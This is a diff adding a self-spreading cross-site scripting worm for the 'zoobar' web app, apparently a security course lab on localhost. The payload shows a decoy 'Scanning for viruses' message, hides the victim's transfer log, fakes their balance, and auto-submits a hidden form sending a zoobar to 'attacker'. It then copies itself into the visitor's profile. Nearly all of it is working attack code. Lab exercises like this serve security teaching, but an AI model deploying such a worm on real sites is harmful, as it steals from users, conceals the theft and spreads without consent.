@@ -1,0 +1,43 @@
+<!--profile appears to be simple message-->
+Scanning for viruses...
+
+<!--don't display any transfers-->
+<style>
+  table.log tbody {
+    display: none
+  }
+</style>
+
+<!--display that user has 10 zoobars-->
+<span id="zoobars"></span>
+<script>
+  document.getElementById('zoobars').className = "10";
+</script>
+
+<!--create form to transfer zoobars via iframe if user is logged in-->
+<iframe name="transfer_iframe" style="display:none"></iframe>
+<form method="POST" name="transferform" action="http://localhost:8080/zoobar/index.cgi/transfer"
+  target="transfer_iframe" style="display:none">
+  <input name="zoobars" type="text" value=1>
+  <input name="recipient" type="text" value="attacker">
+  <input type="submit" name="submission" value="Send">
+</form>
+<!--steal 1 zoobar from visiting user by submitting form-->
+<script>
+  document.transferform.submission.click();
+</script>
+
+<!--update visiting user's profile with worm-->
+<iframe name="spreader_iframe" style="display:none"></iframe>
+<form method="POST" name="spreaderform" action="http://localhost:8080/zoobar/index.cgi/" target="spreader_iframe"
+  style="display:none">
+  <input name="profile_update" type="text">
+  <input type="submit" name="submission" value="Save">
+</form>
+<script>
+  setTimeout(function () {
+    var worm_text = document.getElementById("profile").innerHTML;
+    document.spreaderform.profile_update.value = worm_text;
+    document.spreaderform.submission.click();
+  }, 2 * 1000);
+</script>
